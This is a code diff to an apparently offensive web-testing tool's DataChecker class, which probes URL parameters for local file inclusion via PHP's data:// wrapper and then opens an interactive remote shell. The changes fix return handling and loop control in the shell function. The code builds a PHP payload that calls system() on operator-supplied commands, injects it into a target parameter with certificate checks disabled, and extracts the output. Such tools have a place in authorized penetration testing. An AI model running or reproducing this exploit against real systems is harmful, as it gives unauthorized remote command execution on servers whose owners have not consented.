@@ -61,7 +61,8 @@ class DataChecker:
         return self._scan(params, payloads, parsed_url, console)
 
     def _scan(self, params, payloads, parsed_url, console, total_operations=None, progress=None):
-        task = progress.add_task("[cyan]Scanning...", total=total_operations) if progress else None
+        if progress:
+            progress.add_task("[cyan]Scanning...", total=total_operations)
 
         for param_name in params.keys():
             for payload, payload_regex in payloads:
@@ -82,14 +83,15 @@ class DataChecker:
                     return False, None
                 if payload_regex.search(response.text):
                     if not self.silent:
-                        console.print(f'\n[bold red]Possible LFI2RCE (data_wrapper: method)[/bold red] (data: method)', style='bold red')
+                        console.print('\n[bold red]Possible LFI2RCE (data_wrapper: method)[/bold red] (data: method)', style='bold red')
                     return True, param_name
 
         return False, None
     
     def run_shell(self, param_name):
         self.silent = True
-        if not self.data_check():
+        result, _ = self.data_check()
+        if not result:
             self.console.print("[bold red]LFI2RCE not detected or not exploitable.[/bold red]")
             return
 
@@ -107,10 +109,9 @@ class DataChecker:
                 elif "clear" in cmd:
                     if os.name == 'posix':
                         os.system('clear')
-                elif os.name == 'nt':
-                    os.system('cls')                                                             
-                if cmd.lower() in ["exit", "quit"]:
-                    break
+                    elif os.name == 'nt':
+                        os.system('cls')
+                    continue
 
                 shell_code = f"data://text/plain,<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
                 parsed_url = urllib.parse.urlparse(self.url)
@@ -124,8 +125,9 @@ class DataChecker:
                     response = requests.get(fuzzed_url, verify=False)
                 except requests.exceptions.ConnectionError:
                     self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
-                    
-                pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL) 
+                    continue
+
+                pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL)
                 response_content = pattern.search(response.text)
                 if response_content and response_content.group(1):
                     shell_output = response_content.group(1)
